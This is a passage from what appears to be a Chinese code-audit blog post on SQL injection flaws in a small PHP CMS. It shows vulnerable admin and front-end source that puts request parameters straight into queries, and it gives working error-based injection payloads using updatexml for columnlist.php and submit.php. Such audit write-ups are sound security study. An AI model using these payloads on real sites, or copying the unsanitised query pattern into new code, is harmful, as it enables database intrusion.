+</span></span><span class="line"><span class="cl">    <span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$nav</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$save</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keywords</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;keywords&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$description</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;description&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$px</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;px&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$xs</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;xs&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$xs</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$xs</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tuijian</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tuijian&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$tuijian</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$$tuijian</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$save</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;抱歉，栏目名称不能为空。&#39;);history.back()&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;UPDATE nav SET 
+</span></span></span><span class="line"><span class="cl"><span class="s2">name=&#39;</span><span class="si">$name</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">keywords=&#39;</span><span class="si">$keywords</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">description=&#39;</span><span class="si">$description</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">xs=&#39;</span><span class="si">$xs</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">px=&#39;</span><span class="si">$px</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">content=&#39;</span><span class="si">$content</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">date=now()
+</span></span></span><span class="line"><span class="cl"><span class="s2">WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;修改错误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;亲爱的，一级栏目已经成功编辑。&#39;);location.href=&#39;?r=columnlist&#39;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;UPDATE navclass SET 
+</span></span></span><span class="line"><span class="cl"><span class="s2">name=&#39;</span><span class="si">$name</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">keywords=&#39;</span><span class="si">$keywords</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">description=&#39;</span><span class="si">$description</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">xs=&#39;</span><span class="si">$xs</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">px=&#39;</span><span class="si">$px</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">tuijian=&#39;</span><span class="si">$tuijian</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">date=now()
+</span></span></span><span class="line"><span class="cl"><span class="s2">WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;修改错误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;亲爱的，二级栏目已经成功编辑。&#39;);location.href=&#39;?r=columnlist&#39;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同上</p>
+<h2 id="adminfilescolumnlistphp存在sql注入">admin/files/columnlist.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/checklogin.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$columnlistopen</span> <span class="o">=</span> <span class="s1">&#39;class=&#34;open&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$delete2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete2&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$delete</span> <span class="o">&lt;&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;DELETE FROM nav WHERE id=&#39;</span><span class="si">$delete</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;亲，ID为&#34;</span> <span class="o">.</span> <span class="nv">$delete</span> <span class="o">.</span> <span class="s2">&#34;的栏目已经成功删除！&#39;);location.href=&#39;?r=columnlist&#39;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$delete2</span> <span class="o">&lt;&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;DELETE FROM navclass WHERE id=&#39;</span><span class="si">$delete2</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;亲，ID为&#34;</span> <span class="o">.</span> <span class="nv">$delete2</span> <span class="o">.</span> <span class="s2">&#34;的二级栏目已经成功删除！&#39;);location.href=&#39;?r=columnlist&#39;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>单引号闭合即可,可以使用报错注入</p>
+<p><code>admin/?r=columnlist&amp;delete=' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</code></p>
+<h2 id="adminfilescommentlistphp存在sql注入">admin/files/commentlist.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/checklogin.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hdopen</span> <span class="o">=</span> <span class="s1">&#39;class=&#34;open&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$type</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;comment&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fhlink</span> <span class="o">=</span> <span class="s2">&#34;?r=commentlist&amp;type=comment&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fhname</span> <span class="o">=</span> <span class="s2">&#34;评论&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$taojian</span> <span class="o">=</span> <span class="s2">&#34;type=1 AND cid&lt;&gt;0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$biao</span> <span class="o">=</span> <span class="s2">&#34;content&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;message&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fhlink</span> <span class="o">=</span> <span class="s2">&#34;?r=commentlist&amp;type=message&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fhname</span> <span class="o">=</span> <span class="s2">&#34;留言&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$type</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$taojian</span> <span class="o">=</span> <span class="s2">&#34;type=2 AND cid=0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$biao</span> <span class="o">=</span> <span class="s2">&#34;content&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fhlink</span> <span class="o">=</span> <span class="s2">&#34;?r=commentlist&amp;type=download&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fhname</span> <span class="o">=</span> <span class="s2">&#34;下载评论&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$taojian</span> <span class="o">=</span> <span class="s2">&#34;type=3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$biao</span> <span class="o">=</span> <span class="s2">&#34;download&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$pageyema</span> <span class="o">=</span> <span class="nv">$fhlink</span> <span class="o">.</span> <span class="s2">&#34;&amp;page=&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$delete</span> <span class="o">&lt;&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;DELETE FROM interaction WHERE id=&#39;</span><span class="si">$delete</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;亲，ID为&#34;</span> <span class="o">.</span> <span class="nv">$delete</span> <span class="o">.</span> <span class="s2">&#34;的&#34;</span> <span class="o">.</span> <span class="nv">$fhname</span> <span class="o">.</span> <span class="s2">&#34;已经成功删除！&#39;);location.href=&#39;&#34;</span> <span class="o">.</span> <span class="nv">$fhlink</span> <span class="o">.</span> <span class="s2">&#34;&#39;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同上,在后台传递到sql语句中的参数基本上都没有进行过滤,后台的大部分模块都存在sql注入</p>
+<h2 id="filessubmitphp存在sql注入">files/submit.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$type</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$mail</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mail&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cid</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tz</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tz&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$tz</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">){</span><span class="nv">$tz</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$jz</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;jz&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM interaction WHERE( mail = &#39;</span><span class="si">$mail</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tx</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$touxiang</span> <span class="o">=</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$touxiang</span> <span class="o">=</span> <span class="nv">$tx</span><span class="p">[</span><span class="s1">&#39;touxiang&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先用<code>'</code>闭合,再用<code>)</code>闭合即可,可以使用报错注入</p>
+<p><code>' or updatexml(1,concat(0x7e,(select @@version),0x7e),1))#</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031200549.png" /></p>
+<h2 id="filescontentphp存在sql注入">files/content.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;inc/time.class.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM settings&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$info</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM content WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$navid</span><span class="o">=</span><span class="nv">$content</span><span class="p">[</span><span class="s1">&#39;navclass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM navclass WHERE id=&#39;</span><span class="si">$navid</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$navs</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//浏览计数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;UPDATE content SET hit = hit+1 WHERE id=</span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">;</span>
